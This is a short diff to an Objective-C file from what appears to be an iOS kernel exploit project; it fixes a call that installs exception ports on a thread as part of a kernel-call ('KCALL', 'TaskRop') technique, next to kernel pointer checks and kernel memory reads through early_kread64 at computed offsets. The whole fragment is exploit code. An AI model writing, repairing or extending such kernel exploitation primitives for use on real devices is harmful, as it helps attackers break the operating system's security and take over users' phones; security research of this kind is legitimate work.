@@ -47,7 +47,7 @@ extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_addre
 #import "exploit/kutils.h"          // proc_self() — direct own-proc VA, no allproc walk
 #import "exploit/offsets.h"
 // TaskRop: exception port API
-extern kern_return_t thread_set_exception_port(thread_act_t thread, exception_mask_t exception_mask, mach_port_t port);         // off_proc_ro_pr_task / off_task_map
+         // off_proc_ro_pr_task / off_task_map
 
 static BOOL kpLooksLikeKernelPointer(uint64_t v)
 {
@@ -2455,7 +2455,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     kern_return_t ekr = mach_port_construct(mach_task_self(), &opts, 0, &excport);
                                     kpNote(r, [NSString stringWithFormat:@"  [KCALL] excport kr=0x%x port=0x%x", ekr, excport]);
                                     if (ekr == KERN_SUCCESS && excport && spin && kstack) {
-                                        thread_set_exception_port(hp, EXC_MASK_ALL, excport);
+                                        thread_set_exception_ports(hp, EXC_MASK_ALL, excport, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
                                         // options: TH_IN_MACH_EXCEPTION
                                         uint64_t oVA = hK + 0xC0;
                                         uint64_t o0 = early_kread64(oVA);
